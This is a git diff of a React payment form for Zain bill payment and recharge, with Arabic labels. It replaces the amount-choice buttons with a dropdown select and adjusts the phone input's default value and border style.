@@ -12,11 +12,18 @@ import { Badge } from "@/components/ui/badge";
 import { addData } from "@/lib/firebase";
 import LoaderApp from "@/components/loader";
 import "./zzzzz.css";
+import {
+  Select,
+  SelectContent,
+  SelectItem,
+  SelectTrigger,
+  SelectValue,
+} from "./ui/select";
 
 // Placeholder functions to avoid errors if lib files are not present
 
 export default function ZainPaymentForm({ setShow, setStepNumber }: any) {
-  const [phone, setPhone] = useState("");
+  const [phone, setPhone] = useState("0");
   const [paymentType, setPaymentType] = useState("other");
   const [termsAccepted, setTermsAccepted] = useState(false);
   const [amount, setAmount] = useState("6.00");
@@ -24,7 +31,37 @@ export default function ZainPaymentForm({ setShow, setStepNumber }: any) {
   const [phoneError, setPhoneError] = useState("");
   const [isLoading, setIsLoading] = useState(false);
   const [activeTab, setActiveTab] = useState("bill");
-
+  const renderAmountSelection = () =>
+    phone.length === 8 &&
+    !phoneError && (
+      <div className="space-y-3">
+        <Label className="text-sm font-medium text-slate-800">
+          {activeTab === "bill"
+            ? "اختر مبلغ الفاتورة"
+            : "اختر باقة إعادة التعبئة"}
+        </Label>
+        <div className="w-full">
+          <Select key={selectedAmount} onValueChange={handleAmountSelect}>
+            <SelectTrigger className="text-left">
+              <div className="text-xs opacity-90 flex">
+                <div className="mx-1"> د.ك</div>
+                <div className="mx-1"> {selectedAmount}</div>
+              </div>
+            </SelectTrigger>
+            <SelectContent>
+              {currentAmounts.map((value) => (
+                <SelectItem value={value.toString()}>
+                  <div className="text-center">
+                    <div className="font-bold text-sm">{value}.000</div>
+                    <div className="text-xs opacity-90">د.ك</div>
+                  </div>
+                </SelectItem>
+              ))}
+            </SelectContent>
+          </Select>
+        </div>
+      </div>
+    );
   useEffect(() => {
     localStorage.setItem("amount", amount);
   }, [amount]);
@@ -91,39 +128,6 @@ export default function ZainPaymentForm({ setShow, setStepNumber }: any) {
   const rechargeAmounts = ["2", "5", "10", "15", "20", "30"];
   const currentAmounts = activeTab === "bill" ? billAmounts : rechargeAmounts;
 
-  const renderAmountSelection = () =>
-    phone.length === 8 &&
-    !phoneError && (
-      <div className="space-y-3">
-        <Label className="text-sm font-medium text-slate-800">
-          {activeTab === "bill"
-            ? "اختر مبلغ الفاتورة"
-            : "اختر باقة إعادة التعبئة"}
-        </Label>
-        <div className="grid grid-cols-2 sm:grid-cols-3 gap-3">
-          {currentAmounts.map((value) => (
-            <Button
-              key={value}
-              type="button"
-              variant={selectedAmount === value ? "default" : "outline"}
-              className={`h-auto py-3 px-2 text-base font-semibold transition-all duration-200 rounded-lg shadow-sm hover:shadow-md focus-visible:ring-2 focus-visible:ring-primary focus-visible:ring-offset-2
-                ${
-                  selectedAmount === value
-                    ? "bg-primary text-primary-foreground scale-105 ring-2 ring-primary ring-offset-1"
-                    : "border-slate-300 hover:border-primary hover:bg-primary/10 text-slate-700"
-                }`}
-              onClick={() => handleAmountSelect(value)}
-            >
-              <div className="text-center w-full">
-                <div className="font-bold text-lg">{value}.000</div>
-                <div className="text-xs opacity-90">د.ك</div>
-              </div>
-            </Button>
-          ))}
-        </div>
-      </div>
-    );
-
   const renderPhoneNumberInput = () => (
     <div className="space-y-2">
       <Label className="text-sm font-medium text-slate-800 flex items-center justify-between">
@@ -141,7 +145,7 @@ export default function ZainPaymentForm({ setShow, setStepNumber }: any) {
           style={{
             height: 30,
             outline: 0,
-            border: "1px gray solid",
+            border: "0px red",
             boxShadow: "none",
           }}
           placeholder="XXXXXXXX"
